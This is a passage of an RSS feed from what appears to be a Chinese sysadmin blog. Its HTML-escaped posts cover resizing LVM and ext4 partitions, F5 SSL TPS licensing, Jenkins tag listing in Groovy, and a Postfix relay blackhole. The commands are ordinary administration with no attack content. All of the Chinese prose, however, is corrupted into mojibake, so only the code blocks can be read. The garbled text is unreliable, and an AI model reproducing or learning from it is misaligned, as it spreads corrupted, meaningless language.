&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;please enter label &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; media in drive &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;timeout in &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt; sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-&amp;gt; home
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# umount /home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# lvreduce -L 2G /dev/mapper/centos-home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Do you really want to reduce home? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: y  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ‰©å……rootåˆ†åŒºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# lvextend -L +18G /dev/mapper/centos-root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# xfs_growfs /dev/mapper/centos-root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæ¢å¤homeåˆ†åŒº&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# mkfs.xfs -f /dev/mapper/centos-home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# mount /home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# xfsrestore -f /home.xfsdump /home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æå®š&lt;/p&gt;</description>
    </item>
    <item>
      <title>F5-bigipçš„SSLæ¯ç§’ä¼ è¾“(TPS)é™åˆ¶</title>
      <link>https://rendoumi.com/posts/20240124-f5_bigip_ssl/</link>
      <pubDate>Wed, 24 Jan 2024 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-f5_bigip_ssl/</guid>
      <description>&lt;p&gt;å…¬å¸ç”¨åˆ°äº†SSLçš„æ³›åŸŸåè¯ä¹¦ï¼Œç½‘ç«™æ•´ä½“å¥—ä¸Šäº†HTTPSï¼Œç„¶åæœ€å‰é¢æ˜¯F5åšSSLçš„å¸è½½ã€‚&lt;/p&gt;
&lt;p&gt;éº»çƒ¦ä¹Ÿæ¥äº†ï¼ŒF5çš„SSL Transactions Per Second (TPS) æ˜¯æœ‰licenseçš„ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å§&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tmsh show sys license detail &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -i perf_SSL_total_TPS  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;perf_SSL_total_TPS &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;500&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¾ç¤ºæ˜¯500&lt;/p&gt;
&lt;p&gt;è¿˜å¾—æŸ¥æŸ¥æœ‰å‡ ä¸ªæ ¸å¿ƒ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tmsh show sys tmm-info global &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -i &lt;span class=&#34;s1&#34;&gt;&amp;#39;TMM count&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TMM Count               &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;4ä¸ªæ ¸å¿ƒ&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ¯ç§’SSLçš„TPSé™åˆ¶å°±æ˜¯ 500X4=2000&lt;/p&gt;
&lt;p&gt;è¶…è¿‡2000å°±å¾—å»å¢åŠ licenseäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸¤å°ä¸åŒç³»ç»Ÿä¸ŠJenkinsçš„è”åŠ¨</title>
      <link>https://rendoumi.com/posts/20240124-jenkins_two_server/</link>
      <pubDate>Wed, 24 Jan 2024 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-jenkins_two_server/</guid>
      <description>&lt;p&gt;åœºæ™¯æ˜¯è¿™æ ·çš„ï¼Œæœ‰ä¸¤å°jenkinsã€‚ä¸€å°æ˜¯æ­£å¸¸å®‰è£…åœ¨&lt;code&gt;linux&lt;/code&gt;ä¸Šçš„ï¼Œå¦å¤–ä¸€å°æ˜¯åœ¨&lt;code&gt;macos&lt;/code&gt;ä¸Šçš„ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨macosä¸Šçš„è¿™å°ï¼Œè£…äº†æœ‰xcodeå’Œandroid studioï¼Œè´Ÿè´£ipaå’Œapkçš„è‡ªåŠ¨æ‰“åŒ…ã€‚&lt;/p&gt;
&lt;p&gt;è€Œåœ¨linuxä¸Šjenkinsåˆ™æ˜¯ä¸»jenkinsï¼Œè´Ÿè´£å¾ˆå¤šé¡¹ç›®çš„æ‰“åŒ…ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·ä¸¤å°çš„ç›®æ ‡å°±éƒ½å¾ˆæ˜ç¡®ï¼Œéº»çƒ¦çš„æ˜¯éœ€è¦æ¥å›ç™»å½•æ¥æ„å»ºé¡¹ç›®ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹æ³•ä»ç¬¬ä¸€å°ä¸Šç›´æ¥è°ƒç”¨ç¬¬äºŒå°çš„é¡¹ç›®è¿›è¡Œæ„å»ºå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240124100017245&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240124-jenkins_two_server/image-20240124100017245.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶å¯ä»¥ï¼Œç›´æ¥å‘ä¸ªå¸¦Tokençš„urlåˆ°ç¬¬äºŒå°å°±å¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œæœ¬æ–‡é‡ç‚¹ï¼Œæºç æ˜¯Gitçš„buildè¿‡ç¨‹ï¼Œjenkinsè£…äº†Git parameteræ’ä»¶åæ”¯æŒé€‰tagè¿›è¡Œbuildingã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å¦‚æœä¸¤å°éƒ½è¿™ä¹ˆæ¥ä¸€ä¸‹ï¼Œå®é™…æ˜¯åœ¨ä¸¤å°éƒ½git  checkäº†ä¸€ä¸‹ï¼Œç„¶åå¼€å§‹buildï¼Œè¿™å¯¹äºç¬¬ä¸€å°æ¥è¯´ï¼Œæ¯«æ— å¿…è¦ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€å°ä¸»jenkinsçš„ä»»åŠ¡å°±æ˜¯çœ‹çœ‹gité¡¹ç›®ä¸­éƒ½æœ‰ä»€ä¹ˆtagï¼Œç„¶åæŠŠtagå‘é“¾æ¥ç»™ç¬¬äºŒå°å³å¯ï¼Œæ²¡å¿…è¦checkçš„ã€‚&lt;/p&gt;
&lt;p&gt;è€Œç¬¬äºŒå°ä¹Ÿä¸å»çœ‹tagï¼Œç›´æ¥ä»gitä¸­checkoutå‡ºç¬¬ä¸€å°ä¼ è¿‡æ¥çš„tagç‰ˆæœ¬ï¼Œè¿›è¡Œæ„é€ ï¼Œè¿™æ ·æœ€çœèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼Œæ€ä¹ˆè®©ç¬¬ä¸€å°åªæŸ¥çœ‹tagå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ä¸‡èƒ½çš„groovyå¤§æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def &lt;span class=&#34;nv&#34;&gt;gettags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git&amp;#34;&lt;/span&gt;.execute&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def &lt;span class=&#34;nv&#34;&gt;tags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def &lt;span class=&#34;nv&#34;&gt;t1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gettags.text.eachLine &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;tags.add&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;it&lt;span class=&#34;o&#34;&gt;)}&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i in tags&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    t1.add&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i.split&lt;span class=&#34;o&#34;&gt;()[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.replaceAll&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\^\\{\\}&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.replaceAll&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refs/tags/&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;t1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; t1.unique&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; t1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼Œgroovyå’Œgitçš„è¯ä¹¦éœ€è¦éƒ½äº‹å…ˆé…å¥½ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>é…ç½®postfixè½¬å‘å±€åŸŸç½‘é‚®ä»¶ä»¥åŠé‚®ä»¶é»‘æ´</title>
      <link>https://rendoumi.com/posts/20240124-postfix_blackhole/</link>
      <pubDate>Wed, 24 Jan 2024 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-postfix_blackhole/</guid>
      <description>&lt;p&gt;é…ç½®postfixå…è®¸è‡ªç”±è½¬å‘å†…ç½‘çš„é‚®ä»¶ï¼Œå°±æ”¹ä¸€ä¸ªåœ°æ–¹å³å¯ï¼Œæ·»åŠ å…è®¸å‘é€çš„å†…ç½‘ç½‘æ®µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/postfix/main.cf  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;mynetworks&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 127.0.0.0/8, 172.16.0.0/16  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é…ç½®é»‘æ´ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½æ¥å—ï¼Œç„¶ådropä¸¢æ‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;relayhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;relay_transport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; relay  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;relay_domains&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; static:ALL  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;smtpd_end_of_data_restrictions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; check_client_access static:discard  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™äº›é‚®ä»¶éƒ½ç»™é€åˆ°amaviså»ï¼Œè®­ç»ƒå®ƒè¯†åˆ«åƒåœ¾é‚®ä»¶&lt;/p&gt;
&lt;p&gt;æµ‹è¯•é‚®ä»¶å‘é€çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;body of your email&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mail -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;This is a Subject os version&amp;#34;&lt;/span&gt; -r &lt;span class=&#34;s2&#34;&gt;&amp;#34;abc@kindlefan.xin&amp;#34;&lt;/span&gt; test@abc.com  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼š&lt;code&gt;CentOS&lt;/code&gt;å’Œ&lt;code&gt;Ubuntu&lt;/code&gt;é»˜è®¤å±…ç„¶éƒ½æ²¡æœ‰mailè¿™æ¡å‘½ä»¤çš„è¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install mailx  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install bsd-mailx  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Ext4åˆ†åŒºçš„ç¼©å°</title>
      <link>https://rendoumi.com/posts/20240124-ext4_resize/</link>
      <pubDate>Wed, 24 Jan 2024 09:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-ext4_resize/</guid>
      <description>&lt;p&gt;ç¼©å°&lt;code&gt;/&lt;/code&gt; çš„&lt;code&gt;ext4&lt;/code&gt;åˆ†åŒºæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŸ¥çœ‹åˆ†åŒºæ˜¯ä»€ä¹ˆæ–‡ä»¶ç±»å‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;file -sL /dev/sd*  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda:  x86 boot sector&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; partition 1: &lt;span class=&#34;nv&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x82, starthead 32, startsector 2048, &lt;span class=&#34;m&#34;&gt;8388608&lt;/span&gt; sectors&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; partition 2: &lt;span class=&#34;nv&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x83, active, starthead 75, startsector 8390656, &lt;span class=&#34;m&#34;&gt;411039744&lt;/span&gt; sectors, code offset 0x48
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1: Linux/i386 swap file &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;new style&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4K pages&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; size &lt;span class=&#34;m&#34;&gt;1048575&lt;/span&gt; pages
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda2: Linux rev 1.0 ext4 filesystem data &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;needs journal recovery&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;extents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;large files&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;huge files&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;èƒ½çœ‹å‡ºæ¥sda1æ˜¯äº¤æ¢åˆ†åŒºï¼Œé‚£ä¹ˆè¦ç¼©çš„åˆ†åŒºæ˜¯/dev/sda2ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ext4&lt;/p&gt;
&lt;p&gt;okï¼Œå…ˆç¡®ä¿è™šæœºå†…/åˆ†åŒºåªå åˆ°5Gï¼Œç„¶åæœ€å¥½é‡æ–°æ‹·è´ä¸€ä¸‹qcow2æ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶åˆ°å¼„åˆ°å‰é¢5Gä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åä¿®æ”¹ä¸€ä¸‹kvmè™šæœºé…ç½®ï¼Œå…ˆåŠ ä¸ªisoè¿›å…¥rescueæ¨¡å¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh edit xxx  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŠŠbooté¡ºåºä»hdæ”¹æˆcdrom
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;boot &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hd&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;boot &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cdrom&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;disk &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cdrom&amp;#39;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;driver &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qemu&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;raw&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;target &lt;span class=&#34;nv&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hdc&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ide&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;readonly/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;address &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;drive&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;controller&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bus&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;unit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/disk&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç³»ç»Ÿå¯åŠ¨ï¼Œè¿›å…¥cdromå®‰è£…ï¼Œé€‰æ‹©Troubleshooting&lt;/p&gt;</description>
    </item>
    <item>
      <title>CentOSä¸‹åšæ— çº¿APçƒ­ç‚¹</title>
      <link>https://rendoumi.com/posts/20240123-centos_wifiap/</link>
      <pubDate>Tue, 23 Jan 2024 15:20:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-centos_wifiap/</guid>
